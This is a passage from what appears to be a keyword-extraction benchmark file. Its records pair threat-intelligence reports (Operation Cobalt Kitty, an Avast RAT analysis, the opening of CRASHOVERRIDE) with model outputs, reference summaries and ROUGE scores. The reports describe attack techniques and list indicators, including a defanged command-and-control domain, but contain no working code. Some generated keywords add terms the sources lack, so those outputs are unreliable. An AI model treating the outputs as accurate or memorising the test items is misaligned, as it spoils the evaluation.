"sample_id": "test_111", "prompt_text": "Extract the keywords: OPERATION COBALT KITTY : A LARGE- [PERSON] SCALE [PERSON] APT IN ASIA CARRIED OUT BY THE OCEANLOTUS GROUPMAY 24 , [TIME] 20179 [TIME] minutes to readWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Written by : ASSAF DAHANTOPICSadvancedpersistentthreatSHAREDubbed Operation Cobalt Kitty , the [ORG] APT targeted a global corporation based in [LOC] Asia with the goal of stealing proprietary business information . The threat actor targeted the company \u2019s top - level management by using spear - phishing attacks as the initial penetration vector , ultimately compromising the computers of vice presidents , senior directors and other key personnel in the operational departments . During Operation Cobalt Kitty , the attackers compromised [CARDINAL] more [CARDINAL] than [CARDINAL] 40 PCs and servers , including the domain controller , ( cid:37)le servers , Web application server and database server . Forensic artifacts revealed that the attackers persisted on the network for [DATE] at [DATE] least [DATE] a [DATE] year before [PERSON] Cybereason was deployed . The adversary proved very adaptive and responded to company \u2019s security measures by periodically changing tools , techniques and procedures ( TTPs ) , allowing them to persist on the network for such an extensive period of time . Over 80 payloads and numerous domains were observed in this operation - all of which were undetected by traditional security products deployed in the company \u2019s environment at the time of the attack . The attackers arsenal consisted of modi(cid:37)ed publicly - available tools as well as [CARDINAL] six undocumented custom - built tools , which [PERSON] Cybereason considers the threat actor \u2019s signature tools . Among these tools are [CARDINAL] two backdoors that exploited [ORG] DLL sideloading attack in [ORG] Microsoft , Google and [PERSON] Kaspersky applications . In addition , they developed a novel and stealthy backdoor that targets [ORG] Microsoft [ORG] Outlook for command - and - control channel and data ex(cid:37)ltration . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Based on the tools , modus operandi and IOCs ( indicators of compromise ) observedBased on the tools , modus operandi and IOCs ( indicators of compromise ) observed in [FAC] Operation [FAC] Cobalt [FAC] Kitty , [ORG] Cybereason attributes this large - scale cyber espionage [ORG] APT to [ORG] the \u201c [ORG] OceanLotus [ORG] Group \u201d ( which is also known as , [ORG] APT [ORG] - C-00 , [ORG] SeaLotus and APT32 ) . For detailed information tying [ORG] Operation [ORG] Cobalt [ORG] Kitty to [ORG] the [ORG] OceanLotus [ORG] Group , please see our Attacker \u2019s [ORG] Arsenal and Threat Actor Pro(cid:37)le sections . [PERSON] Cybereason also attributes the recently reported [ORG] Backdoor . Win32.Denis to [ORG] the [ORG] OceanLotus [ORG] Group , which at the time of this report \u2019s writing , had not been of(cid:37)cially linked to this threat actor . Finally , this report offers a rare glimpse into what a cyber espionage [ORG] APT looks like \" under - the - hood \" . [PERSON] Cybereason was able to monitor and detect the entire attack lifecycle , from in(cid:37)ltration to ex(cid:37)ltration and all the steps in between . Our report contains the following detailed sections ( PDF):\uf101 Cobalt Kitty Lifecycle : A step - by - step analysis\uf101 [ORG] Cobalt [ORG] Kitty Attacker \u2019s [ORG] Arsenal : Deep dive into the tools used in the APT\uf101 Cobalt Kitty Threat Actor Pro(cid:37)le and Indicators of CompromiseHIGH - LEVEL ATTACK OUTLINE : A [ORG] CAT - AND- MOUSE GAME IN [CARDINAL] FOUR ACTSWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!The following sections outline the [CARDINAL] four phases of the attack as observed by [ORG] Cybereason \u2019s analysts , who were called to investigate the environment after the company \u2019s IT department suspected that their network was breached but could not trace the source . PHASE [CARDINAL] ONE : FILELESS OPERATION ( POWERSHELL AND COBALT STRIKE PAYLOADS)Based on the forensic evidence collected from the environment , phase one was the continuation of the original attack that began [DATE] about [DATE] a [DATE] year before [PERSON] Cybereason was deployed in the environment . During that phase , the threat actor operated a ( cid:37)leless [ORG] PowerShell - based infrastructure , using customized [ORG] PowerShell payloads taken from known offensive frameworks such as [PERSON] Cobalt [PERSON] Strike , [PERSON] PowerSploit and [PERSON] Nishang . The initial penetration vector was carried out by social engineering . Carefully selected group of employees received spear - phishing emails , containing either links to malicious sites or weaponized Word documents . These documents contained malicious macros that created persistence on the compromised machine using [CARDINAL] two scheduled tasks , whose purpose was to download secondary payloads ( mainly [PERSON] Cobalt [PERSON] Strike Beacon):Scheduled task [CARDINAL] 1 : Scheduled task [CARDINAL] 1 : Downloads a COM scriptlet that redirects to Cobalt Strike payload : Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Scheduled task [CARDINAL] 2 : Scheduled task [CARDINAL] 2 : Uses Javascript to download a Cobalt Strike Beacon : See more detailed analysis of the malicious documents in our [PRODUCT] Attack [PRODUCT] Life [PRODUCT] Cycle section . FILELESS PAYLOAD DELIVERY FILELESS PAYLOAD DELIVERY INFRASTRUCTURE INFRASTRUCTUREWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!INFRASTRUCTURE INFRASTRUCTUREIn the ( cid:37)rst phase of the attack , the attackers used a ( cid:37)leless in - memory payload delivery infrastructure consisting of the following components:1 . VBS and [ORG] PowerShell - based loaders [PERSON] VBS and [ORG] PowerShell - based loadersThe attackers dropped [PERSON] Visual [PERSON] Basic and [ORG] PowerShell scripts in folders that they created under the [PRODUCT] ProgramData ( a hidden folder , by default ) . The attackers created persistence using Windows \u2019 registry , services and scheduled tasks . This persistence mechanism ensured that the loader scripts would execute either at startup or at predetermined intervals . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Values found in Windows \u2019 Registry : the VBS scripts are executed by Windows \u2019 Wscript at startup : Wscript at startup : The .vbs scripts as well as the .txt ( cid:37)les contain the loader \u2019s script , which launches [ORG] PowerShell with a base64 encoded command , which either loads another [ORG] PowerShell script ( [ORG] e.g Cobalt Strike Beacon ) or fetches a payload from the command - and - control ( [ORG] C&C ) server:2 . In - memory ( cid:28)leless payloads from [ORG] C&C servers In - memory ( cid:28)leless payloads from [ORG] C&C serversThe payloads served by the [ORG] C&C servers are mostly [ORG] PowerShell scripts with embedded base64 - encoded payloads ( [ORG] Metasploit [ORG] and [ORG] Cobalt [ORG] Strike payloads):Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Example [CARDINAL] 1 : [ORG] PowerShell payload with embedded [PERSON] Shellcode downloading Example 1 : [ORG] PowerShell payload with embedded [PERSON] Shellcode downloading [WORK_OF_ART] Cobalt [WORK_OF_ART] Strike [WORK_OF_ART] Beacon [WORK_OF_ART] Cobalt [WORK_OF_ART] Strike [PERSON] BeaconThe decoded payload is a shellcode , whose purpose is to retrieve a Cobalt Strike Beacon from the [ORG] C&C server : Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Example [CARDINAL] 2 : Cobalt Strike Beacon embedded in obfuscated [ORG] PowerShell [ORG] Example [ORG] 2 : Cobalt Strike Beacon embedded in obfuscated PowerShellA [ORDINAL] second type of an obfuscated [ORG] PowerShell payload consisted of [GPE] Cobalt [GPE] Strike \u2019s [GPE] Beacon payload : [TIME] Less [TIME] than [TIME] 48 [TIME] hours after [PERSON] Cybereason alerted the company about [TIME] the [TIME] Less [TIME] than [TIME] 48 [TIME] hours after [PERSON] Cybereason alerted the company about the breach breach , the attackers started to change their approach and almost completelyWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!abandoned the [ORG] PowerShell infrastructure that they had been using - replacing it with sophisticated custom - built backdoors . The attackers \u2019 remarkable ability to quickly adapt demonstrated their skill and familiarity with and command of the company \u2019s network and its operations . The attackers most likely replaced the [ORG] PowerShell infrastructure after the company used both [ORG] Windows [ORG] Group [ORG] Policy [ORG] Object ( [ORG] GPO ) and [PERSON] Cybereason \u2019s execution prevention feature to prevent [ORG] PowerShell execution . PHASE [CARDINAL] TWO : [PERSON] BACKDOORS EXPLOITING [GPE] DLL- PHASE [CARDINAL] TWO : [PERSON] BACKDOORS EXPLOITING DLL- HIJACKING AND USING DNS TUNNELING HIJACKING AND USING [ORG] DNS TUNNELINGAfter realizing that the [ORG] PowerShell infrastructure had been discovered , the attackers had to quickly replace it to maintain persistence and continue the operation . Replacing this infrastructure in [TIME] 48 [TIME] hours suggests that the threat actors were prepared for such a scenario . During the [ORDINAL] second phase of the attack , the attackers introduced [CARDINAL] two the attackers introduced [CARDINAL] two sophisticated backdoors that they attempted to deploy on selected sophisticated backdoors that they attempted to deploy on selected targets . targets . The introduction of the backdoors is a key turning point in the investigation since it demonstrated the threat actor \u2019s resourcefulness and skill - set . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!At the time of the attack , these backdoors were undetected and At the time of the attack , these backdoors were undetected and undocumented undocumented by any security vendor . Recently , [PERSON] Kaspersky researchers identi(cid:37)edundocumented undocumented by any security vendor . Recently , [PERSON] Kaspersky researchers identi(cid:37)ed a variant of [CARDINAL] one of the backdoors as [ORG] Backdoor . Win32.Denis . The attackers had to make sure that they remained undetected so the backdoors were designed to be as stealthy as possible . To avoid being discovered , the malware authors used these techniques : Backdoors exploiting [ORG] DLL hijacking against trusted applications [ORG] Backdoors exploiting [ORG] DLL hijacking against trusted applicationsThe backdoor exploited a vulnerability called \u201c [ORG] DLL hijacking malware inside trusted software . This technique exploits a security vulnerability found in legitimate software , which allows the attackers to load a fake [ORG] DLL and and legitimate security software , allowing them to continue their operations without raising any suspicions . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!raising any suspicions . [ORG] DNS [ORG] Tunneling as [CARDINAL] C2 channel - DNS Tunneling as [CARDINAL] C2 channel -In attempt to overcome network ( cid:37)ltering solutions , the attackers implemented a stealthier [CARDINAL] C2 communication method , using \u201c DNS Tunneling \u201d \u2013 a method of [CARDINAL] C2 communicating and data ex(cid:37)ltration using the [ORG] DNS protocol . To ensure that the [ORG] DNS traf(cid:37)c would not be ( cid:37)ltered , the attackers con(cid:37)gured the backdoor to communicate with [ORG] Google and OpenDNS [ORG] DNS servers , since most organizations and security products will not ( cid:37)lter traf(cid:37)c to those [CARDINAL] two major [ORG] DNS services . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!The screenshot below shows the traf(cid:37)c generated by the backdoor and demonstrates [ORG] DNS Tunneling for C2 communication . As shown , while the destination [ORG] DNS packet : PHASE [CARDINAL] THREE : NOVEL MS OUTLOOK PHASE [CARDINAL] THREE : NOVEL MS OUTLOOK BACKDOOR AND LATERAL MOVEMENT SPREE BACKDOOR AND LATERAL MOVEMENT SPREEWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation [GPE] API!In the [ORDINAL] third phase of the operation , the attackers harvested credentials stored on the compromised machines and performed lateral movement and infected new machines . The attackers also introduced a very rare and stealthy technique introduced a very rare and stealthy technique to communicate with their servers and ex(cid:37)ltrate data using [ORG] Microsoft [ORG] Outlook [ORG] Microsoft [ORG] Outlook . OUTLOOK MACRO BACKDOOR OUTLOOK [ORG] MACRO BACKDOORWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation [GPE] API!In a relentless attempt to remain undetected , the attackers devised a very stealthyIn a relentless attempt to remain undetected , the attackers devised a very stealthy [CARDINAL] C2 channel that is hard to detect since it leverages an email - based [CARDINAL] C2 channel . The attackers installed a backdoor macro in [ORG] Microsoft [ORG] Outlook installed a backdoor macro in [ORG] Microsoft [ORG] Outlook that enabled them to execute commands , deploy their tools and steal valuable data from the compromised machines . For a detailed analysis of the Outlook backdoor , please see [ORG] the Attacker \u2019s [ORG] Arsenal section . This technique works as follows : Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!1 . The malicious macro scans the victim \u2019s Outlook inbox and looks for the strings\u201c$$cpte \u201d and \u201c $ [MONEY] $ ecpte \u201d \u201c $ [MONEY] $ cpte \u201d \u201c $ [MONEY] $ ecpte\u201d.2 . Then the macro will open a [ORG] CMD shell that will execute whatever instruction /command is in between the strings.3 . The macro deletes the message from inbox to ensure minimal risk of [ORG] exposure.4 . The macro searches for the special strings in the \u201c [WORK_OF_ART] Deleted [WORK_OF_ART] Items \u201d folder to ( cid:37)ndthe attacker \u2019s email address and sends the data back to the attackers via email.5 . Lastly , the macro will delete any evidence of the emails received or sent by theattackers . CREDENTIAL DUMPING AND LATERAL CREDENTIAL DUMPING AND LATERAL MOVEMENT MOVEMENTMimikatz credential dumping tool as their main The attackers used the famous [LOC] Mimikatz tool to obtain credentials including user passwords , [ORG] NTLM hashes and [ORG] Kerberos tickets . [PERSON] Mimikatz is a very popular tool and is detected by most antivirus vendors and other security products . Therefore , the attackers used over [CARDINAL] 10 different customized [PERSON] Mimikatz payloads , which were obfuscated and packed in a way that allowed them to evade antivirus detection . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!The following are examples of [LOC] Mimikatz command line arguments detected duringThe following are examples of [LOC] Mimikatz command line arguments detected during the attack : The stolen credentials were used to infect more machines , leveraging Windows built - in tools as well as pass - the - ticket and pass - the - hash attacks . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!PHASE [CARDINAL] FOUR : [ORG] NEW [ORG] ARSENAL AND ATTEMPT PHASE [CARDINAL] FOUR : [ORG] NEW [ORG] ARSENAL AND ATTEMPT TO RESTORE POWERSHELL TO RESTORE POWERSHELL INFRASTRUCTURE INFRASTRUCTUREAfter a [DATE] four [DATE] week lull and no apparent malicious activity , the attackers returned to the scene and introduced new and improved tools aimed at bypassing the security mitigations that were implemented by the company \u2019s IT team . These tools and methods mainly allowed them to bypass the [ORG] PowerShell execution mainly allowed them to bypass the [ORG] PowerShell execution restrictions and password dumping mitigations restrictions and password dumping mitigations . During that phase , [PERSON] Cybereason found a compromised server that was used as the main attacking machine , where the attackers stored their arsenal in a network share , which made it easier to spread their tools to other machines on the network . The attackers \u2019 arsenal consisted:\uf101 New variants of [PERSON] Denis and Goopy backdoors New variants of [PERSON] Denis and Goopy backdoors\uf101 PowerShell Restriction Bypass ToolPowerShell Restriction Bypass Tool -- Adapted from [ORG] PSUnlock GithubWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!project.\uf101 [ORG] PowerShell Cobalt Strike Beacon -PowerShell Cobalt Strike Beacon - New payload + new [ORG] C2 [ORG] domain\uf101 [ORG] PowerShell [ORG] Obfuscator [ORG] -PowerShell Obfuscator - All the new [ORG] PowerShell payloads are obfuscatedusing a publicly available script adapted from a [PERSON] Daniel Bohannon \u2019s GitHub project.\uf101 HookPasswordChangeHookPasswordChange -- Inspired by tools found on [ORG] GitHub , this tool alerts theattackers if a password has been changed . Using this tool , the attackers could overcome a password reset . The attackers modi(cid:37)ed their tool.\uf101 Customized Windows Credentials Dumper -Customized Windows Credentials Dumper - A [ORG] PowerShell password dumper that is based on a known password dumping tool , using [ORG] PowerShell bypass and re(cid:75)ective loading . The attackers speci(cid:37)cally used it to obtain Outlook passwords.\uf101 Customized Outlook Credentials Dumper -Customized Outlook Credentials Dumper - Inspired by known Outlookcredentials dumpers.\uf101 [PERSON] Mimikatz [PERSON] -Mimikatz [PERSON] - [PERSON] PowerShell and [PERSON] Binary versions , with multiple layers ofobfuscation . Please see [ORG] the Attacker \u2019s [ORG] Arsenal section for detailed analysis of the tools . An analysis of this arsenal shows that the attackers went out of their way to restore the [ORG] PowerShell - based infrastructure , even though it had already been detected and shut down once . The attackers \u2019 preference to use a ( cid:37)leless infrastructure speci(cid:37)cally in conjunction with [PERSON] Cobalt [PERSON] Strike is very evident . This could suggest that the attackers preferred to use known tools that are moreWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!could suggest that the attackers preferred to use known tools that are more expendable rather than using their own custom - built tools , which were used as a last resort . [ORG] CONCLUSION [ORG] CONCLUSIONOperation [ORG] Cobalt [ORG] Kitty was a major cyber espionage [ORG] APT that targeted a global corporation in [LOC] Asia and was carried out by [ORG] the [ORG] OceanLotus [ORG] Group . The analysis of this [ORG] APT proves how determined and motivated the attackers were . They continuously changed techniques and upgraded their arsenal to remain under the radar . In fact , they never gave up , even when the attack was exposed and shut down by the defenders . During the investigation of [ORG] Operation [ORG] Cobalt [ORG] Kitty , [PERSON] Cybereason uncovered and analyzed new tools in [ORG] the [ORG] OceanLotus [ORG] Group \u2019s attack arsenal , such as:\uf101 New backdoor ( \u201c Goopy \u201d ) using [ORG] HTTP and [ORG] DNS [ORG] Tunneling for C2 communication.\uf101 Undocumented backdoor that used Outlook for [CARDINAL] C2 communication and dataex(cid:37)ltration.\uf101 Backdoors exploiting [ORG] DLL sideloading attacks in legitimate applications fromMicrosoft , [ORG] Google and Kaspersky.\uf101 [CARDINAL] Three customized credential dumping tools , which are inspired by known tools . Web page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!In addition , [ORG] Cybereason uncovered new variants of the \u201c Denis \u201d backdoor andIn addition , [PERSON] Cybereason uncovered new variants of the \u201c Denis \u201d backdoor and managed to attribute the backdoor to [ORG] the [ORG] OceanLotus [ORG] Group - a connection that had not been publicly reported before . This report provides a rare deep dive into a sophisticated [ORG] APT that was carried out by [CARDINAL] one of the most fascinating groups operating in [LOC] Asia . The ability to closely monitor and detect the stages of an entire [ORG] APT lifecycle - from initial in(cid:37)ltration to data ex(cid:37)ltration - is far from trivial . The fact that most of the attackers \u2019 tools were not detected by the antivirus software and other security products deployed in the company \u2019s environment before [ORG] Cybereason , is not surprising . The attackers obviously invested signi(cid:37)cant time and effort in keeping the operation undetected , striving to evade antivirus detection . As the investigation progressed , some of the IOCs observed in [ORG] Operation [ORG] Cobalt [ORG] Kitty started to emerge in the wild , and recently some were even reported being used in other campaigns . It is important to remember , however , that IOCs have a tendency to change over time . Therefore , understanding a threat actor \u2019s behavioral patterns is essential in combatting modern and sophisticated APTs . The modus operandi and tools served as behavioral ( cid:37)ngerprints also played an important role in tying [ORG] Operation [ORG] Cobalt [ORG] Kitty to [ORG] the [ORG] OceanLotus [ORG] Group . Lastly , our research provides an important testimony to the capabilities and working methods of [ORG] the [ORG] OceanLotus [ORG] Group . [ORG] Operation [ORG] Cobalt [ORG] Kitty is unique in many ways , nonetheless , it is still just [CARDINAL] one link in the group \u2019s ever - growing chain of [ORG] APT campaigns . Orchestrating multiple [ORG] APT campaigns in parallel and attacking a broadWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation [GPE] API!campaigns . Orchestrating multiple [ORG] APT campaigns in parallel and attacking a broad spectrum of targets takes an incredible amount of resources , time , manpower and motivation . This combination is likely to be more common among nation - state actors . While the are many rumours and speculations circulating in the [ORG] InfoSec community , at the time of writing , there was no publicly available evidence that can con(cid:37)rm that [ORG] the [ORG] OceanLotus [ORG] Group is a nation - state threat actor . Until such evidence is made public , we will leave it to our readers to judge for themselves . To be continued [ORG] Meow . [ORG] LEARN MORE ABOUT CYBEREASONS NGAV AND HOW IT CAN PROTECTYOUR ORGANIZATIONLEARN MOREWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!ADVANCED PERSISTENT THREAT ( [ORG] APT ) [CARDINAL] 101APTS , THE [ORG] BOARD , AND [ORG] YOUWHY [ORG] ANTIVIRUS [ORG] SOFTWARE IS BECOMING THE ROOTKIT YOU PAY FORREAD MOREReturn to [ORG] BlogSUBSCRIBE [ORG] FOR [ORG] UPDATESSHAREWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API!Contact Bl ogPodcas t\uf09a \uf099 \uf0e1 [ORG] \uf167PRODUCTSDeep [ORG] Detect [ORG] & RespondDeepPreventDeepInvestigateDeepRespondRansomFreeDemosSERVICESDeepMonitoringDeepHuntingDeep IncidentResponsePLATFORMHow It [PRODUCT] WorksDeep [PRODUCT] BehavioralIntel [PRODUCT] Engine [PRODUCT] Deep [PRODUCT] Sensor [ORG] ArchitectureCustomer [ORG] Service [ORG] & SuccessComplete SecurityVisibilityFull TheaterViewCompliance [ORG] & Certi(cid:45)cationCOMPANYWho WeAreCareersManagement [ORG] NewsroomAwards ContactUsPARTNERBecome a PartnerRANSOMFREEFree ransomware protection for yourPCINSIGHTSWebinarsVideos [PERSON] Reads\"Cybereason \u201d andare proprietary trademarks of [ORG] Cybereason [ORG] Inc. [PERSON] Cybereason \u00ae is federally registered in [GPE] the [GPE] United [GPE] States and other countriesCopyright \u00a9 [DATE] 2018 [ORG] Cybereason [ORG] Inc. All rights reserved . Terms of Use | Privacy PolicyWeb page converted to [ORG] PDF with the PDFmyURL [ORG] PDF creation API !", "generated_text": "PDF; Operation Cobalt Kitty; a global corporation; Asia; spear-phishing attacks; over 40 PCs; servers; Web application server; database server; The attackers; the network; at least a year; system info; over 80 payloads; over 80 payloads; domains; Command; control; domains; the OceanLotus Group; OceanLotus; APT32; a novel; stealthy backdoor; Microsoft Outlook; command; control; macros; command; a CAT-and-Mouse game; four stages; the attack; the obfuscation; compromise; the threat actor; the tools; files; the network; a year; the malware; The report; indicators; compromise; the environment; the nature; techniques.", "ref_text": "<START-1>The report analyzes an advanced persistent threat (APT) campaign dubbed Operation Cobalt Kitty carried out by a threat actor group called OceanLotus or APT-C-00. The group targeted a large Asia-based global corporation to steal proprietary data. The attack occurred in four phases over more than a year. Initial access was gained via spear-phishing. The attackers first used a fileless PowerShell infrastructure with Cobalt Strike and other payloads. After being detected, they quickly shifted to custom backdoors exploiting DLL side-loading in legitimate software. The backdoors used DNS tunneling for command and control, avoiding detection by firewalls. The attackers also developed a stealthy Outlook macro backdoor for command execution and data exfiltration. Credential harvesting and lateral movement followed using tools like Mimikatz. In later phases, the attackers continuously adapted their tactics, creating new variations of tools, bypassing mitigations like PowerShell restrictions, and restoring access. Their arsenal included customized credential dumpers, obfuscators, and bypass tools. In total, over 40 systems including critical servers were compromised over the year-long campaign. The attacker's tools went undetected by traditional security products, demonstrating APT groups' capabilities to evolve and evade defenses. The report provides extensive technical analysis of OceanLotus' tactics, techniques, and procedures. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5314285714285715, "gpt3/lexical/rouge_rouge2": 0.16666666666666666, "gpt3/lexical/rouge_rougeL": 0.2571428571428572, "gpt3/lexical/rouge_rougeLsum": 0.2571428571428572, "gpt3_generated_text": ["The article discusses Operation Cobalt Kitty, a large-scale cyber espionage attack carried out by the OceanLotus Group targeting a global corporation based in Asia. The attackers used spear-phishing attacks to compromise over 40 PCs and servers, including the domain controller, file servers, web application server, and database server. They persisted on the network for at least a year, adapting to security measures and using over 80 payloads and numerous domains undetected by traditional security products. The attackers utilized custom-built tools and a novel backdoor targeting Microsoft Outlook for command-and-control and data exfiltration. Cybereason attributes this APT to the OceanLotus Group and provides a detailed analysis of the attack lifecycle, tools, and indicators of compromise. The attack is outlined in four phases, including fileless operations, obfuscation, compromise, and the malware. The report offers insight into the nature and techniques of cyber espionage APTs."]}, {"split_name": "test", "sample_id": "test_112", "prompt_text": "Extract the keywords: decoded.avast.io /threatintel / avast - finds - compromised - philippine - navy - certificate - used - in - remote - access - tool/ Avast Finds Compromised Philippine Navy Certificate Used in Remote Access Tool \u22ee 3/28/2022by Threat Intelligence [DATE] TeamMarch 28 , [DATE] 20224 min readAvast [ORG] Threat [ORG] Intelligence [ORG] Team has found a remote access tool ( RAT ) actively being used in the wild in the [GPE] Philippines that uses what appears to be a compromised digital certificate belonging to [ORG] the [ORG] Philippine [ORG] Navy . This certificate is now expired but we see evidence it was in use with this malware in [DATE] June 2020.Based on our research , we believe with a high level of confidence that the threat actor had access to the private key belonging to the certificate . We got in touch with CERT - PH , [ORG] the [ORG] National [ORG] Computer [ORG] Emergency [ORG] Response [ORG] Team for the [GPE] Philippines to help us contact the navy . We have shared with them our findings . The navy security team later let us know that the incident has been resolved and no further assistance was necessary from our side . Because this is being used in active attacks now , we are releasing our findings immediately so organizations can take steps to better protect themselves . We have found that this sample is now available on [ORG] VirusTotal . Compromised Expired Philippine Navy Digital Certificate In our analysis we found the sample connects to dost[.]igov - service[.]net:8443 using [ORG] TLS in a statically linked OpenSSL library . A [ORG] WHOIS lookup on the [ORG] C&C domain gave us the following:1/4The digital certificate was pinned so that the malware requires the certificate to communicate . When we checked the digital certificate used for the [ORG] TLS channel we found the following information : Some important things to note : The certificate is a valid certificate with a subject of * .navy.mil.ph , [ORG] the [ORG] Philippine [ORG] Navy . The certificate has recently expired : it was valid for [DATE] one [DATE] year , from [DATE] Sunday [DATE] December 15 , [DATE] 2019 until [DATE] Tuesday [DATE] December 15 , [DATE] 2020 . Our research shows that [ORG] Censys saw this certificate employed by the actual navy.mil.ph websiteBased on our research , we believe with a high level of confidence that the threat actor had access to the private key belonging to the certificate . While the digital certificate is now expired we see evidence it was in use with this malware in [DATE] June [DATE] 2020.The malicious [ORG] PE file was found with filename : [CARDINAL] C:\\Windows\\System32\\wlbsctrl.dll and its hash is : 85FA43C3F84B31FBE34BF078AF5A614612D32282D7B14523610A13944AADAACB.In analyzing that malicious [ORG] PE file itself , we found that the compilation timestamp is wrong or was edited . Specifically , the TimeDateStamp of the [ORG] PE file was modified and set to [DATE] the [DATE] year [DATE] 2004 in both the [ORG] PE header and [PERSON] Debug [PERSON] Directory as shown below:2/4However , we found that the author used OpenSSL 1.1.1 g and compiled it on [DATE] April 21 , [DATE] 2020 as shown below : The username of the author was probably udste . This can be seen in the debug information left inside the used OpenSSL library . We found that the malware supported the following commands : run shellcode cancel data transfer list drives rename a file delete a file list directory contentSome additional items of note regarding the malicious [ORG] PE file : All configuration strings in the malware are encrypted using AES - CBC with the exception of the mutex it uses . That mutex is used as - is without decryption : t7As7y9I6EGwJOQkJz1oRvPUFx1CJTsjzgDlm0CxIa4=. When this string is decrypted using the hard - coded key it decrypts to QSR_MUTEX_zGKwWAejTD9sDitYcK. We suspect that this is a failed attempt to disguise this malware as the infamous Quasar RAT malware . But this can not be the case because this sample is written in [LANGUAGE] C++ and the Quasar RAT is written in C#.Avast customers are protected against this malware.3/4Indicators of [PERSON] Compromise ( IoC)Repository : url 85FA43C3F84B31FBE34BF078AF5A614612D32282D7B14523610A13944AADAACB C:\\Windows\\System32\\wlbFile nameMutex t7As7y9I6EGwJOQkJz1oRvPUFx1CJTsjzgDlm0CxIa4 = [ORG] C&C server dost[.]igov - service[.]net:84432022 Copyright \u00a9 Avast Software s.r.o.4/4", "generated_text": "Avast Threat Intelligence Team; a remote access tool; RAT; the Philippines; the compromised digital certificate; the Philippine Navy; this certificate; the threat actor; the private key; the certificate; use; June 2020; The malware; shellcode; data transfer; commands; the decryption; AES-CBC; the mutex; the decrypted key; the user; the encrypted key; a keylogger; the selected port; DLL; the compromised certificate; a variant; the decrypted key; a port; the decrypted key; the name; the decryption algorithm; the Internet; the incident; the key; the media; the threat actor; organizations.", "ref_text": "<START-1>Avast Threat Intelligence discovered a remote access trojan (RAT) being used in active attacks in the Philippines. The RAT uses an expired digital certificate belonging to the Philippine Navy that appears to have been compromised. The certificate was valid from December 15, 2019 to December 15, 2020. Avast believes the threat actors likely had access to the private key. The RAT was seen using this certificate still in June 2020 after it had expired. The RAT connects to a command and control server at dost[.]igov-service[.]net over port 8443 using TLS. The certificate is pinned so only this specific certificate can be used. Analysis of the malware shows the compilation timestamp was modified to show 2004, but the version of OpenSSL used was from April 2020. The developer username found was likely \"udste.\" The RAT has capabilities like executing shellcode, reading/writing files, deleting files, and listing drives and directories. The commands are encrypted except for a hard-coded mutex string meant to mimic the Quasar RAT. Avast notified CERT-PH and the Philippine Navy. The navy stated the incident was resolved and no further help was needed. Avast customers are protected from this threat. The key points are that a valid Philippine Navy certificate was compromised and abused to sign malware, the RAT has several malicious capabilities, and Avast worked with Philippine authorities to disclose the findings. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5103092783505154, "gpt3/lexical/rouge_rouge2": 0.19689119170984454, "gpt3/lexical/rouge_rougeL": 0.31443298969072164, "gpt3/lexical/rouge_rougeLsum": 0.31443298969072164, "gpt3_generated_text": ["The Avast Threat Intelligence Team has discovered a remote access tool (RAT) being actively used in the Philippines, utilizing a compromised digital certificate belonging to the Philippine Navy. The certificate, now expired, was used in conjunction with the malware in June 2020, indicating that the threat actor had access to its private key. Despite the incident being resolved, organizations are urged to take immediate steps to protect themselves. The malicious PE file, found in the Windows System32 directory, supports various commands including shellcode and data transfer. Additionally, all configuration strings in the malware are encrypted using AES-CBC, with the exception of a hard-coded mutex. While the sample is written in C++, it was initially suspected to be a variant of the Quasar RAT due to a failed attempt to disguise itself as such. Avast customers are already protected against this malware, and the necessary indicators of compromise have been provided to aid in detection and prevention."]}, {"split_name": "test", "sample_id": "test_113", "prompt_text": "Extract the keywords: CRASHOVERRIDE Analysis of the Threat to [ORG] Electric [ORG] Grid [ORG] OperationsDRAGOS INC . / WWW.DRAGOS.COM version [WORK_OF_ART] 2.20170613CRASHOVERRIDE [WORK_OF_ART] Analyzing [WORK_OF_ART] the [WORK_OF_ART] Threat [WORK_OF_ART] to [WORK_OF_ART] Electric [WORK_OF_ART] Grid [WORK_OF_ART] OperationsContents Why Are We Publishing This Introduction to Electric Grid Operations Evolution of Tradecraft Ukraine Cyber Attack [DATE] 2015 Backdoor / RAT Module Data Wiper Module IEC 104 Module IEC 101 Module OPC DA Module SIPROTECT DoS Module Implications of capability Attack Option : De - energize substation [LAW] Attack Option : [LAW] Force [LAW] an [LAW] Islanding [LAW] event [LAW] Adding [LAW] Amplification [LAW] Attacks [LAW] Using [LAW] OPC to create a Denial of Visibility Using CVE-2015 - 5374 to hamper protective relays [ORG] Dragos , [ORG] Inc. was notified by the Slovak anti - virus firm ESET of an [ORG] ICS tailored mal- ware on [DATE] June 8th , [DATE] 2017 . The Dragos team was able to use this notification to find samples of the malware , identify new functionality and impact scenarios , and con- firm that this was the malware employed in [DATE] the [DATE] December 17th , [DATE] 2016 cyber - attack on the [GPE] Kiev , [GPE] Ukraine transmission substation which resulted in electric grid opera- tions impact . This report serves as an industry report to inform the electric sector and security community of the potential implications of this malware and the appro- priate details to have a nuanced discussion . Why Are We Publishing This Security firms must always balance a need to inform the public against empowering adversaries with 